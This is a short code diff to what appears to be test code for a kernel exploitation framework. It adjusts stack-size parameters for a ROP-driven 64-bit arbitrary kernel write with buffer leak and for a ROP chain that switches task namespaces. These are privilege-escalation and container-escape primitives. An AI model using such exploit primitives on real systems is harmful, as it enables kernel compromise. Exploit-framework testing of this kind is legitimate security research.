@@ -110,7 +110,8 @@ public:
         uint64_t new_value = 0x1122334455667788;
 
         auto target_buf_addr = xdk_->AllocBuffer(p.GetData(), true);
-        ExecuteRopAction(RopActionId::WRITE_WHAT_WHERE_64, {target_buf_addr + target_offs, new_value}, 0, 0);
+        // max_stack = 0, but interrupt causes it to be more
+        ExecuteRopAction(RopActionId::WRITE_WHAT_WHERE_64, {target_buf_addr + target_offs, new_value}, 0, 256);
 
         auto buf_leak = xdk_->Read(target_buf_addr, p.Size());
         Log("Leaked buffer:\n%s", HexDump::Dump(buf_leak).c_str());
@@ -157,7 +158,7 @@ public:
 
           auto rop = GetRopChain();
           rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {(uint64_t)getpid()});
-          ExecuteRopChain(rop, 0, 512);
+          ExecuteRopChain(rop, 0, 600);
 
           auto restored_ns = Syscalls::readlink("/proc/self/ns/ipc");
           Log("after SWITCH_TASK_NAMESPACES %u %u %s", getuid(), getpid(), restored_ns.c_str());
